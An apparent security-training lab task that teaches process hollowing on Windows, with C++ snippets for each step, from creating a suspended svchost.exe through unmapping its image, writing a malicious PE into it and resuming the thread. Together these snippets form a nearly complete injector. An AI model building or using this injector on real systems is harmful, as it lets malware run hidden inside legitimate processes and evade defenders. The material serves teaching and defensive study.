# Task 3 - Expanding Process Abuse

In the previous task, we discussed how we can use shellcode injection to inject malicious code into a legitimate process. In this task we will cover process hollowing. Similar to shellcode injection, this technique offers the ability to inject an entire malicious file into a process. This is accomplished by "hollowing" or un-mapping the process and injecting specific PE (**Portable Executable**) data and sections into the process.

At a high-level, process hollowing can be broken up into six steps:

1. Create a target process in a suspended state.
2. Open a malicious image.
3. Un-map legitimate code from process memory.
4. Allocate memory locations for malicious code and write each section into the address space.
5. Set an entry point for the malicious code.
6. Take the target process out of a suspended state.

The steps can also be broken down graphically to depict how Windows API calls interact with process memory.

We will break down a basic process hollowing injector to identify each of the steps and explain in more depth below.

At step one of process hollowing, we must create a target process in a suspended state using `CreateProcessA`. To obtain the required parameters for the API call we can use the structures `STARTUPINFOA` and `PROCESS_INFORMATION`.

```cpp
LPSTARTUPINFOA target_si = new STARTUPINFOA(); // Defines station, desktop, handles, and appearance of a process
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // Information about the process and primary thread
CONTEXT c; // Context structure pointer

if (CreateProcessA(
  (LPSTR)"C:\\Windows\\System32\\svchost.exe", // Name of module to execute
  NULL,
  NULL,
  NULL,
  TRUE, // Handles are inherited from the calling process
  CREATE_SUSPENDED, // New process is suspended
  NULL,
  NULL,
  target_si, // pointer to startup info
  target_pi) == 0) { // pointer to process information
  cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
  return 1;
}
```

In step two, we need to open a malicious image to inject. This process is split into three steps, starting by using `CreateFileA` to obtain a handle for the malicious image.

```cpp
HANDLE hMaliciousCode = CreateFileA(
  (LPCSTR)"C:\\Users\\tryhackme\\malware.exe", // Name of image to obtain
  GENERIC_READ, // Read-only access
  FILE_SHARE_READ, // Read-only share mode
  NULL,
  OPEN_EXISTING, // Instructed to open a file or device if it exists
  NULL,
  NULL
);
```

Once a handle for the malicious image is obtained, memory must be allocated to the local process using `VirtualAlloc`. `GetFileSize` is also used to retrieve the size of the malicious image for `dwSize`.

```cpp
DWORD maliciousFileSize = GetFileSize(
  hMaliciousCode, // Handle of malicious image
  0 // Returns no error
);

PVOID pMaliciousImage = VirtualAlloc(
  NULL,
  maliciousFileSize, // File size of malicious image
  0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
  0x04 // Enables read/write access (PAGE_READWRITE)
);
```

Now that memory is allocated to the local process, it must be written. Using the information obtained from previous steps, we can use `ReadFile` to write to local process memory.

```cpp
DWORD numberOfBytesRead; // Stores number of bytes read

if (!ReadFile(
  hMaliciousCode, // Handle of malicious image
  pMaliciousImage, // Allocated region of memory
  maliciousFileSize, // File size of malicious image
  &numberOfBytesRead, // Number of bytes read
  NULL
  )) {
  cout << "[!] Unable to read Malicious file into memory. Error: " << GetLastError() << endl;
  TerminateProcess(target_pi->hProcess, 0);
  return 1;
}

CloseHandle(hMaliciousCode);
```

At step three, the process must be "hollowed" by un-mapping memory. Before un-mapping can occur, we must identify the parameters of the API call. We need to identify the location of the process in memory and the entry point. The CPU registers `EAX` (entry point), and `EBX` (PEB location) contain the information we need to obtain; these can be found by using `GetThreadContext`. Once both registers are found, `ReadProcessMemory` is used to obtain the base address from the `EBX` with an offset (`0x8`), obtained from examining the PEB.

```cpp
c.ContextFlags = CONTEXT_INTEGER; // Only stores CPU registers in the pointer
GetThreadContext(
  target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
  &c // Pointer to store retrieved context
); // Obtains the current thread context

PVOID pTargetImageBaseAddress;
ReadProcessMemory(
  target_pi->hProcess, // Handle for the process obtained from the PROCESS_INFORMATION structure
  (PVOID)(c.Ebx + 8), // Pointer to the base address
  &pTargetImageBaseAddress, // Store target base address
  sizeof(PVOID), // Bytes to read
  0 // Number of bytes out
);
```

After the base address is stored, we can begin un-mapping memory. We can use `ZwUnmapViewOfSection` imported from `ntdll.dll` to free memory from the target process.

```cpp
HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll"); // Obtains the handle for ntdll
pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
  hNtdllBase, // Handle of ntdll
  "ZwUnmapViewOfSection" // API call to obtain
); // Obtains ZwUnmapViewOfSection from ntdll

DWORD dwResult = pZwUnmapViewOfSection(
  target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
  pTargetImageBaseAddress // Base address of the process
);
```

At step four, we must begin by allocating memory in the hollowed process. We can use `VirtualAllocEx` similar to step two to allocate memory. This time we need to obtain the size of the image found in file headers. `e_lfanew` can identify the number of bytes from the DOS header to the PE header. Once at the PE header, we can obtain the `SizeOfImage` from the Optional header.

```cpp
PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; // Obtains the DOS header from the malicious
image
PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew); // Obtains the
NT header from e_lfanew

DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage; // Obtains the size of the optional header
from the NT header structure

PVOID pHollowAddress = VirtualAllocEx(
  target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
  pTargetImageBaseAddress, // Base address of the process
  sizeOfMaliciousImage, // Byte size obtained from optional header
  0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
  0x40 // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)
);
```

Once the memory is allocated, we can write the malicious file to memory. Because we are writing a file, we mustfirst write the PE headers then the PE sections. To write PE headers, we can use `WriteProcessMemory` and the size of headers to determine where to stop.

```cpp
if (!WriteProcessMemory(
  target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
  pTargetImageBaseAddress, // Base address of the process
  pMaliciousImage, // Local memory where the malicious file resides
  pNTHeaders->OptionalHeader.SizeOfHeaders, // Byte size of PE headers
  NULL
)) {
  cout << "[!] Writting Headers failed. Error: " << GetLastError() << endl;
}
```

Now we need to write each section. To find the number of sections, we can use `NumberOfSections` from the NT headers. We can loop through `e_lfanew` and the size of the current header to write each section.

```cpp
for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { // Loop based on number of sections in PE data
  PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew
+ sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // Determines the current PE section header

  WriteProcessMemory(
      target_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
      (PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), // Base address of current section
      (PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), // Pointer for content of current
section
      pSectionHeader->SizeOfRawData, // Byte size of current section
      NULL
  );
}
```

It is also possible to use relocation tables to write the file to target memory. This will be discussed in moredepth in task 6.

At step five, we can use `SetThreadContext` to change `EAX` to point to the entry point.

```cpp
c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); // Set the context
structure pointer to the entry point from the PE optional header

SetThreadContext(
  target_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
  &c // Pointer to the stored context structure
);
```

At step six, we need to take the process out of a suspended state using `ResumeThread`.

```cpp
ResumeThread(
  target_pi->hThread // Handle to the thread obtained from the PROCESS_INFORMATION structure
);
```

We can compile these steps together to create a process hollowing injector. Use the C++ injector provided and experiment with process hollowing.

